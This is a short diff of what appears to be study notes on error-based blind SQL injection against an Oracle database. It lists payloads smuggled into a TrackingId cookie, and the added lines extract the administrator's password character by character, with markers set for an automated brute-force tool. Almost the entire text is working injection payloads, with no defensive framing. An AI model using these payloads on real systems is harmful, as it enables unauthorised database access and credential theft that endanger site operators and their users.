@@ -24,3 +24,6 @@ Condition based (only true statement will be cause error)
 TrackingId=mp6CeV77mIcXSepY'||(select case when (1=2) then to_char(1/0) else '' end from dual )||'
 
 TrackingId=mp6CeV77mIcXSepY'||(select case when (1=2) then to_char(1/0) else '' end FROM users WHERE username='administrator' )||'
+
+to check first character of password string [200:wrong character,error:right character ]
+TrackingId=mp6CeV77mIcXSepY'||(select case when substr(password,1,1)='§a§' then to_char(1/0) else '' end FROM users WHERE username='administrator')||'
